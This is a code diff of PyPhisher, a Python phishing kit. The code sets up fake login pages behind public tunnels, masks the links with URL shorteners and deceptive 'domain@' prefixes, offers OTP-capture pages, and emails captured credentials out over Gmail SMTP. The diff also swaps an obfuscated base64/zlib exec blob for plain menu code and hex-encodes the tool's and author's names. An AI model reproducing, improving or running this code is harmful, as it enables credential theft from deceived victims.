     global email, password, receiver
-    message = f"From: {email}\nTo: {receiver}\nSubject: PyPhisher Login Credentials\n\n{msg}"
+    message = f"From: {email}\nTo: {receiver}\nSubject: \x50\x79\x50\x68\x69\x73\x68\x65\x72 Login Credentials\n\n{msg}"
     try:
         internet()
         with smtp('smtp.gmail.com', 465) as server:
@@ -389,7 +614,7 @@ def readable(byte, precision = 2, is_speed = False):
     return size
 
 # Dowbload files with progress bar(if necessary)
-def download(url, path, size=None):
+def download(url, path):
     from time import ctime, time
     session = Session()
     filename = basename(path)
@@ -399,73 +624,40 @@ def download(url, path, size=None):
         mkdir(directory)
     newfile = filename.split(".")[0] if "." in filename else filename
     newname = filename if len(filename) <= 12 else filename[:9]+"..."
-    print(f"\n{info}Downloading {green}{newfile.title()}{nc}...\n")
     for i in range(retry):
         try:
+            print()
             with open(path, "wb") as file:
-                internet()
                 response = session.get(url, stream=True, timeout=20)
-                chunk_size = 4096 #KB
                 total_length = response.headers.get('content-length')
-                length = int(total_length or size or "0")
-                downloaded = 0
-                alldata = b""
-                max_len = columns - 38
-                newname_space = " " * (14 - len(newname))
-                max_len2 = columns - 50
-                pre_space = 0
-                suf_space = max_len2
-                stime = time()
-                for data in response.iter_content(chunk_size=chunk_size):
-                    etime = time()
-                    downloaded += len(data)
-                    alldata += data
-                    speed = chunk_size/float(etime-stime)
-                    readable_speed = readable(speed, is_speed=True)
-                    file.write(data)
-                    readable_size = readable(len(alldata))
-                    if length == 0:
-                        stdout.write(f"\r{newname}{newname_space}[{' '*pre_space}<=======>{' '*suf_space}] {readable_size} {readable_speed}")
-                        stdout.flush()
-                        if pre_space == max_len2:
-                            forward = False
-                        if suf_space == max_len2:
-                            forward = True
-                        if forward:
-                            pre_space+=1
-                            suf_space-=1
-                        else:
-                            pre_space-=1
-                            suf_space+=1
-                    else:
-                        done = int(max_len * downloaded / length)
-                        # Arrow will progress as the data increases with done
-                        arrow = "=" * done
-                        # Space will decrease as done increases
-                        arrow_space = " " * (max_len - done)
-                        percentage = round(downloaded * 100 / length, 2)
-                        stdout.write(f"\r{newname}{newname_space}[{arrow}>{arrow_space}] {percentage}% {readable_speed}")
-                        stdout.flush()
-                    stime = time()
-                if length == 0:
-                    stdout.write(f"\r{newname}{newname_space}[<{'=' * (max_len2+7)}>] {readable_size}{' ' * 20}")
+                if total_length is None: # no content length header
+                    file.write(response.content)
                 else:
-                    stdout.write(f"\r{newname}{newname_space}[{'=' * max_len}>] 100.0%{' ' * 20}")
-                stdout.flush()
-                # This print fixes the cursor to newline
-                print()
+                    downloaded = 0
+                    total_length = int(total_length)
+                    with Progress(
+                        TextColumn("[bold blue]{task.fields[filename]}", justify="right"),
+                        BarColumn(bar_width=None),
+                        "[progress.percentage]{task.percentage:>3.1f}%",
+                        "•",
+                        TransferSpeedColumn(),
+                        "•",
+                        TimeRemainingColumn()
+                    ) as progress:
+                        task = progress.add_task(newfile, total=total_length, filename=newfile.title())
+                        for data in response.iter_content(chunk_size=4096):
+                            file.write(data)
+                            progress.update(task, advance=len(data))
                 break
         except Exception as e:
-            print()
             remove(path)
             append(e, error_file)
-            print(f"{error}Download failed due to: {str(e)}")
+            print(f"\n{error}Download failed due to: {str(e)}")
             print(f"\n{info}Retrying {i}/{retry}{nc}")
             sleep(1)
     if not isfile(path):
         print(f"\n{error}Download failed permanently!")
         pexit()
-
 
 # Extract zip/tar/tgz files
 def extract(file, extract_path='.'):
@@ -550,41 +742,20 @@ def show_options(sites):
             options += optioner(i, 20) + "\n"
     options += "\n"
     if isfile(saved_file) and cat(saved_file)!="":
-        options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} Main Menu       {green}[{white}0{green}]{yellow} Exit\n\n"
+        options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved      {green}[{white}x{green}]{yellow} More Tools      {green}[{white}0{green}]{yellow} Exit\n\n"
     else:
-        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}x{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
+        options += f"{green}[{white}a{green}]{yellow} About                   {green}[{white}m{green}]{yellow} Main Menu         {green}[{white}0{green}]{yellow} Exit\n\n"
     lolcat(options)
 
 
-# Set up ngrok authtoken to work with ngrok links
-def nr_token():
-    global nr_command
-    while True:
-        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
-             break
-        has_token = input(f"\n{ask}Do you have ngrok authtoken? [y/n/help]: {green}")
-        if has_token == "y":
-            token = input(f"\n{ask}Enter your ngrok authtoken: {green}")
-            shell(f"{nr_command} config add-authtoken {token}")
-            sleep(1)
-            break
-        elif has_token == "help":
-            sprint(nr_help, 0.01)
-            sleep(3)
-        elif has_token in ["n", ""]:
-            break
-        else:
-            print(f"\n{error}Invalid input '{has_token}'!")
-            sleep(1)
-
-# Set up ngrok authtoken to work with ngrok links
+# Set up loclx authtoken to work with loclx links
 def lx_token():
     global lx_command
     while True:
         status = shell(f"{lx_command} account status", True).stdout.decode("utf-8").strip().lower()
         if not "error" in status:
             break
-        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/n/help]: {green}")
+        has_token = input(f"\n{ask}Do you have loclx authtoken? [y/N/help]: {green}")
         if has_token == "y":
             shell(f"{lx_command} account login")
             break
@@ -598,22 +769,75 @@ def lx_token():
             sleep(1)
 
 def ssh_key():
-    if not isfile(f"{home}/.ssh/id_rsa.pub"):
-        print(f"\n{info}Press enter three times for ssh key generation{nc}\n")
-        sleep(1)
-        shell("ssh-keygen")
+    if key and not isfile(f"{ssh_dir}/id_rsa"):
+        # print(f"\n{info}Please wait for a while! Press enter three times when asked for ssh key generation{nc}\n")
+        # sleep(1)
+        # shell("ssh-keygen")
+        print(nc)
+        shell(f"mkdir -p {ssh_dir} && ssh-keygen -N '' -t rsa -f {ssh_dir}/id_rsa")
     is_known = bgtask("ssh-keygen -F localhost.run").wait()
     if is_known != 0:
-        shell("ssh-keyscan -H localhost.run >> ~/.ssh/known_hosts", True)
+        shell(f"ssh-keyscan -H localhost.run >> {ssh_dir}/known_hosts", True)
 
 
 # Output urls
-def url_manager(url, arg1, arg2):
+def url_manager(url, tunneler):
     global mask
-    print(f"\n{info2}{arg1} > {yellow}{url}")
-    print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
+    masked = mask + "@" + url.replace('https://','')
+    title = f"[bold cyan]{tunneler}[/]"
+    text = f"[blue]URL[/] [green]:[/] [yellow]{url}[/]\n[blue]MaskedURL[/] [green]:[/] [yellow]{masked}[/]"
+    cprint(
+        Panel(
+            text,
+            title=title,
+            title_align="left",
+            border_style="green"
+        )
+    )
+    #print(f"\n{info2}{arg1} > {yellow}{url}")
+    #print(f"{info2}{arg2} > {yellow}{mask}@{url.replace('https://','')}")
     sleep(0.5)
 
+
+def shortener1(url):
+    website = "https://is.gd/create.php?format=simple&url="+url.strip()
+    internet()
+    try:
+        res = get(website).text
+    except Exception as e:
+        append(e, error_file)
+        res = ""
+    shortened = res.split("\n")[0] if "\n" in res else res
+    if "https://" not in shortened:
+        return ""
+    return shortened
+
+def shortener2(url):
+    website = "https://api.shrtco.de/v2/shorten?url="+url.strip()
+    internet()
+    try:
+        res = get(website).text
+        json_resp = parse(res)
+    except Exception as e:
+        append(e, error_file)
+        json_resp = ""
+    if json_resp != "":
+        if json_resp["ok"]:
+            return json_resp["result"]["full_short_link"]
+    return ""
+
+def shortener3(url):
+    website = "https://tinyurl.com/api-create.php?url="+url.strip()
+    internet()
+    try:
+        res = get(website).text
+    except Exception as e:
+        append(e, error_file)
+        res = ""
+    shortened = res.split("\n")[0] if "\n" in res else res
+    if "https://" not in shortened:
+        return ""
+    return shortened
     
 # Copy website files from custom location
 def customfol():
@@ -648,12 +872,13 @@ def saved():
 # Info about tool
 def about():
     clear()
-    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}PyPhisher{yellow}] ")
+    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}\x50\x79\x50\x68\x69\x73\x68\x65\x72{yellow}] ")
     print(f"{red}{yellow}[{purple}Version{yellow}]       {cyan} : {yellow}[{green}{version}{yellow}] ")
-    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}KasRoudra{yellow}] ")
-    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/KasRoudra{purple}{yellow}] ")
-    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/KasRoudra{yellow}] ")
-    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}kasroudrakrd@gmail.com{yellow}] ")
+    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
+    print(f"{red}{yellow}[{purple}Github{yellow}]        {cyan} : {yellow}[{green}https://github.com/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{purple}{yellow}] ")
+    print(f"{red}{yellow}[{purple}Messenger{yellow}]     {cyan} : {yellow}[{green}https://m.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
+    print(f"{red}{yellow}[{purple}Telegram {yellow}]     {cyan} : {yellow}[{green}https://t.me/\x4b\x61\x73\x52\x6f\x75\x64\x72\x61{yellow}] ")
+    print(f"{red}{yellow}[{purple}Email{yellow}]         {cyan} : {yellow}[{green}\x6b\x61\x73\x72\x6f\x75\x64\x72\x61krd@gmail.com{yellow}] ")
     print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
     inp = input(f"\n{ask}Choose your option: {green}")
     if inp == "0":
@@ -662,23 +887,21 @@ def about():
         return
 
 
-# Optional function for ngrok url masking
+# Optional function for url masking
 def masking(url):
     cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
-    if cust=="":
+    if cust in [ "", "n", "N", "no" ]:
         return
-    website = "https://is.gd/create.php?format=simple&url="+url.strip()
-    internet()
-    try:
-        res = get(website).text
-    except Exception as e:
-        append(e, error_file)
-        res = ""
-    resp = res.split("\n")[0] if "\n" in res else res
-    if "https://" not in resp:
-        sprint(f"{error}Service not available!\n{error}{resp}")
+    if (shortened:=shortener1(url)) != "":
+        pass
+    elif (shortened:=shortener2(url)) != "":
+        pass
+    elif (shortened:=shortener3(url)) != "":
+        pass
+    else:
+        sprint(f"{error}Service not available!")
         waiter()
-    short = resp.replace("https://", "")
+    short = shortened.replace("https://", "")
     # Remove slash and spaces from inputs
     domain = input(f"\n{ask}Enter custom domain(Example: google.com, yahoo.com > ")
     if domain == "":
@@ -693,7 +916,18 @@ def masking(url):
     else:
         bait = sub("([/%+&?={} ])", "-", bait)+"@"
     final = domain+bait+short
-    sprint(f"\n{success}Your custom url is > {bgreen}{final}")
+    print()
+    #sprint(f"\n{success}Your custom url is > {bcyan}{final}")
+    title = "[bold blue]Custom[/]"
+    text = f"[cyan]URL[/] [green]:[/] [yellow]{final}[/]"
+    cprint(
+        Panel(
+            text,
+            title=title,
+            title_align="left",
+            border_style="blue",
+        )
+    )
 
 
 # Staring functions
@@ -712,12 +946,12 @@ def updater():
         # Changelog of each versions are seperated by three empty lines
         changelog = get("https://raw.githubusercontent.com/KasRoudra/PyPhisher/main/files/changelog.log").text.split("\n\n\n")[0]
         clear(fast=True)
-        print(f"{info}PyPhisher has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
-        upask=input(f"\n{ask}Do you want to update PyPhisher?[y/n] > {green}")
+        print(f"{info}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has a new update!\n{info2}Current: {red}{version}\n{info}Available: {green}{git_ver}")
+        upask=input(f"\n{ask}Do you want to update \x50\x79\x50\x68\x69\x73\x68\x65\x72?[y/n] > {green}")
         if upask=="y":
             print(nc)
-            shell("cd .. && rm -rf PyPhisher pyphisher && git clone https://github.com/KasRoudra/PyPhisher")
-            sprint(f"\n{success}PyPhisher has been updated successfully!! Please restart terminal!")
+            shell(f"cd .. && rm -rf PyPhisher pyphisher && git clone {repo_url}")
+            sprint(f"\n{success}\x50\x79\x50\x68\x69\x73\x68\x65\x72 has been updated successfully!! Please restart terminal!")
             if (changelog != "404: Not Found"):
                 sprint(f"\n{info2}Changelog:\n{purple}{changelog}")
             exit()
@@ -730,7 +964,7 @@ def updater():
 
 # Installing packages and downloading tunnelers
 def requirements():
-    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
+    global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
     if termux:
         try:
             if not isfile(saved_file):
@@ -739,6 +973,15 @@ def requirements():
                 data = checkfile.read()
         except:
             shell("termux-setup-storage")
+        try:
+            if not isfile(saved_file):
+                mknod(saved_file)
+            with open(saved_file) as checkfile:
+                data = checkfile.read()
+        except:
+            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
+            sleep(2)
+            pexit()
     internet()
     if termux:
         if not is_installed("proot"):
@@ -757,65 +1000,45 @@ def requirements():
     osinfo = uname()
     platform = osinfo.system.lower()
     architecture = osinfo.machine
-    isngrok = isfile(f"{tunneler_dir}/ngrok")
     iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
     isloclx = isfile(f"{tunneler_dir}/loclx")
-    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
+    delete("cloudflared.tgz", "cloudflared", "loclx.zip")
     internet()
     if "linux" in platform:
         if "arm64" in architecture or "aarch64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
         elif "arm" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
         elif "x86_64" in architecture or "amd64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
         else:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
-        if isfile("ngrok.tgz"):
-            extract("ngrok.tgz", f"{tunneler_dir}")
-            remove("ngrok.tgz")
     elif "darwin" in platform:
         if "x86_64" in architecture or "amd64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{tunneler_dir}")
-                remove("ngrok.zip")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                 extract("cloudflared.tgz", f"{tunneler_dir}")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
         elif "arm64" in architecture or "aarch64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{tunneler_dir}")
-                remove("ngrok.zip")
             if not iscloudflared:
                 print(f"{error}Device architecture unknown. Download cloudflared manually!")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
         else:
-            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
+            print(f"{error}Device architecture unknown. Download cloudflared/loclx manually!")
             sleep(3)
     else:
         print(f"{error}Device not supported!")
@@ -830,8 +1053,6 @@ def requirements():
         if is_running(process):
             print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
             pexit()
-    if is_installed("ngrok"):
-        nr_command = "ngrok"
     if is_installed("cloudflared"):
         cf_command = "cloudflared"
     if is_installed("localxpose"):
@@ -856,7 +1077,6 @@ def requirements():
         extract("websites.zip", sites_dir)
         remove("websites.zip")
     if mode != "test":
-        nr_token()
         lx_token()
         ssh_key()
     email_config = cat(email_file)
@@ -869,12 +1089,92 @@ def requirements():
         if "@gmail.com" in email:
             is_mail_ok = True
         else:
-            print(f"\n{error}Only gmail with app password is allowed")
+            print(f"\n{error}Only gmail with app password is allowed!{nc}")
             sleep(1)
 
 # Main Menu to choose phishing type
 
-_ = lambda __ : __import__("\x7a\x6c\x69\x62").decompress(__import__("\x62\x61\x73\x65\x36\x34").b64decode(__[::-1]));exec((_)(b'EehVQNw/f/+7537L1mgINRnOTsZRdcRIT9JehMOOR58APRKcgmYFQQzct97a9q3deNx3nYRGCCR4Gmx9WTXlUfl7nIFWMEuGoHb+h8JEM2C+ZO+psoRNS7szrN3SchXn/L9UqXSy0XNFhvk8U/jFJWRhBSLH7Fd/D00hVjHKnp7lZ7FQKWdvtxebByWw4o79FYfAo4XH6w0X/IzWRXKUBhqploPf1ZAZHPkt48J6hAvNldThlw2a3hwhqrlWh0ksl7rz8zmsr1eO33WLT3Sh3cKDHqP3vltSZOlVGayo/Y5QXj8XWfL/CE5kZBZOplPRWbzhhQ0Laq+9zNw+v2bAZgTLSAbfXXEnNTUdoVkOi48buO+GZ25GUCXQmyHjeiOeUSp69TMYzrGEam1Tm4XjGZWvWVmTOWUAiwuyi3xyJYAlEBRYK3q48Px0hYDhLWpKlYFw+ggjO7pMXbmv+u9z6FvcjskpxuBlttpwjy4gecDNj/dqe4NiIMwGuS6Qf9EOZhdUQsc/6ngxK7pQWJ+Cc5lJYUTDC1YM+mBdTDyGoLfmC5To+krdDncweVMZC/qKVgy9p5X1vZNQBHWL46Ba0f2KOzOdJQJrgIJLUpPR0N+VwzWcp87ipM1BWQhSivJwzmRmsCzNEG9SZhd8HIKT42rK6JRIF7KfTYdSus+yV2zAAHctCBTdFL+ABZAXbJBiNF74NyRhemMTww17k8tN6eY11UDFKGIyElbXiCiCmhMxyop/iGBdb94pkvRUhJqHbLg++g9c6v4M2HfU2tCX5g6SMHnu75+LaDvjJ7my8642878fAi1oXUy9skSy1J+k3YxbMojD9AOhjd2F7MvPYcpzvQ2yIYRuTxS61es2X07mByAj3QnBJqAq+s8iAzIJyPex81gzup+pGcTByKf6Xc0PPJBi5E202JbZbgikdo3HQt/zjEuU6fQRC/TADSBS5QdxajTFgd/dKGpO8LK6mc6v+k+RVtxG69BQyvxqmyTZ28ncRlLs/GRKSB2OYu3Qpxz0He6pzQitgDVz9vgM0Mgu3JtAAAzDB3pqz1jnbFSJX8GsE2di8THVlK/16dJ7YoL9iGpcZDkPPmK6iLB6h2rYIP+65juOayLn5JstNRicfHQD8YRN0k3+WPTdiSLVcCfi2m08+ZbfB9VxOTqpbGwRvbKybA1kBNsTwqK15IDaZFjLOIYBkMPWXQM09xg8rdiHvKnlRAm3Skj/sNUZbZp4vLHiRz4s0bf98y57wI+8eJGuG5NwG7x3hhcQZUSLyh43fqBMECwn7wir5DXjf4pRxr1a8TTG3lnYf4J0CHvu/LPKbZTnWOqJJu4gO3hwxjQhNbswH/ohK/wb+mOysZ2kRNnRVQl9I5dRPaoiHdwQy7YFJaeBQSWzpWodAqVq3JS4jSOcEqdMFezvLc7UbGjDOnxfd+4l56wn0DETR4fLLLfN6H6r3gO5Rs4qwxTtU8lrS2TjX/cdXCGegOo6bXd0tU0F6mCEEgj7w5Ln1hR272M8FTLM/A7Ru6TQXSeE44m+fxVruD8bSJkK9R9GVhNw01tJy1oKmH4vkf7l/uSqbqtyWUfJm9XQmJV7n32FYbIGvc1Qb53h+PV/9//nPr+m5e7EDi7OdVPbLJBBPiTHmc3dQsNggpK/lHNQCoFpSUE1NwJe'))
+def main_menu():
+    global mode, option, mask, troubleshoot, url, redir_url
+    shell("stty -echoctl") # Skip printing ^C
+    if update:
+        updater()
+    requirements()
+    if troubleshoot in ts_commands:
+        command = ts_commands[troubleshoot]
+        shell(command)
+        pexit()
+    tempdata = cat(templates_file)
+    if is_json(tempdata):
+        sites = parse(tempdata)
+    else:
+        sprint(f"\n{error}templates.json file is corrupted!")
+        exit(1)
+    customdir = None
+    otp_folder = ""
+    names = [site["name"] for site in sites]
+    choices = [str(i) for i in range(1,len(sites)+1)]
+    while True:
+        clear(lol=True)
+        show_options(names)
+        if option is not None:
+            choice = option
+        elif mode == "test":
+            choice = default_template
+        else:
+            choice = input(f"{ask}Select one of the options > {green}")
+        if choice != "0" and choice.startswith("0"):
+            choice = choice.replace("0", "")
+        if choice in choices:
+            site = sites[int(choice)-1] # Lists start from 0 but our index starts from 1
+            folder = site["folder"]
+            if "otp_folder" in site:
+                otp_folder = site["otp_folder"]
+            if "mask" in site:
+                mask = site["mask"]
+            if "redirect" in site:
+                redir_url = site["redirect"]
+            if folder == "custom" and mask == "custom":
+                customdir = customfol()
+            if otp_folder != "":
+                is_otp = input(f"\n{ask}Do you want OTP Page? [y/n] > {green}")
+                if is_otp == "y":
+                    folder = otp_folder
+            break
+        elif choice.lower()=="a":
+            about()
+        elif choice.lower()=="s":
+            saved()
+        elif choice.lower()=="m":
+            bgtask("xdg-open 'https://github.com/KasRoudra/KasRoudra#My-Best-Works'")
+        elif choice == "0":
+            pexit()
+        else:
+            sprint(f"\n{error}Wrong input {bred}\"{choice}\"")
+            option = None
+    if customdir is None:
+        site = f"{sites_dir}/{folder}"
+        if not isdir(site):
+            internet()
+            delete("site.zip")
+            download(f"https://github.com/KasRoudra/files/raw/main/phishingsites/{folder}.zip", "site.zip")
+            extract("site.zip", site)
+            remove("site.zip")
+        copy(site, site_dir)
+        if mode == "test":
+            metaurl = ""
+        else:
+            metaurl = input(f"\n{ask}{bcyan}Enter shadow url {green}({blue}for social media preview{green}){bcyan}[{red}press enter to skip{bcyan}] : {green}")
+        write_meta(metaurl)
+        if url is not None:
+            redirect_url = url
+        else:
+            if mode == "test":
+                redirect_url = ""
+            else:
+                redirect_url = input(f"\n{ask}{bcyan}Enter redirection url{bcyan}[{red}press enter to skip{bcyan}] : {green}")
+        write_redirect(redirect_url)
+    server()
 
 # Start server and tunneling
 def server():
@@ -888,7 +1188,11 @@ def server():
     for logfile in [php_file, cf_file, lx_file, lhr_file]:
         delete(logfile)
         if not isfile(logfile):
-            mknod(logfile)
+            try:
+                mknod(logfile)
+            except:
+                sprint(f"\n{error}Your terminal lacks file/folder permission! Fix it or run me from docker!")
+                pexit()
     php_log = open(php_file, "w")
     cf_log = open(cf_file, "w")
     lx_log = open(lx_file, "w")
@@ -913,21 +1217,13 @@ def server():
         arguments = f"--region {region}"
     if subdomain is not None:
         arguments = f"{arguments} --subdomain {subdomain}"
-    bgtask(f"{nr_command} http {arguments} {local_url}")
     bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
     bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
-    bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
-    sleep(10)
-    try:
-        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
-        nr_url = nr_api["tunnels"][0]["public_url"]
-    except Exception as e:
-        append(e, error_file)
-        nr_url = ""
-    if nr_url != "":
-        nr_success=True
+    if key:
+        bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     else:
-        nr_success=False
+        bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
+    sleep(10)
     cf_success = False
     for i in range(10):
         cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
@@ -944,32 +1240,28 @@ def server():
         sleep(1)
     lhr_success = False
     for i in range(10):
-        lhr_url = grep("(https://[-0-9a-z.]*.lhrtunnel.link)", lhr_file)
+        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
         if lhr_url != "":
             lhr_success = True
             break
         sleep(1)
-    if nr_success or cf_success or lx_success or lhr_success:
-        sprint(f"\n{info}Your urls are given below:")
+    if cf_success or lx_success or lhr_success:
+        sprint(f"\n{info}Your urls are given below:\n")
         if mode == "test":
-            print(f"\n{info}URL Generation completed successfully!")
-            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
+            print(f"\n{info}URL generation has completed successfully!")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
             pexit()
-        if nr_success:
-            url_manager(nr_url, "Ngrok", "NR Masked")
         if cf_success:
-            url_manager(cf_url, "CloudFlared", "CF Masked")
+            url_manager(cf_url, "CloudFlared")
         if lx_success:
-            url_manager(lx_url, "LocalXpose", "LX Masked")
+            url_manager(lx_url, "LocalXpose")
         if lhr_success:
-            url_manager(lhr_url, "LocalHR", "LHR Masked")
-        if nr_success and tunneler.lower() == "ngrok":
-            masking(nr_url)
-        elif lx_success and tunneler.lower() == "loclx":
+            url_manager(lhr_url, "LocalHostRun")
+        if lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
-        elif lhr_success and tunneler.lower() == "localhostrun":
+        elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
             masking(lhr_url)
-        elif cf_success and tunneler.lower() == "cloudflared":
+        elif cf_success and tunneler.lower() in [ "cloudflared", "cf" ]:
             masking(cf_url)
         else:
             print(f"\n{error}URL masking isn't available for {tunneler}!{nc}")
@@ -1017,9 +1309,6 @@ if __name__ == '__main__':
     except KeyboardInterrupt:
         pexit()
     except Exception as e:
-        try:
-            exception_handler(e)
-        except:
-            exit()
+        exception_handler(e)
             
 # If this code helped you, consider staring repository. Your stars encourage me a lot!
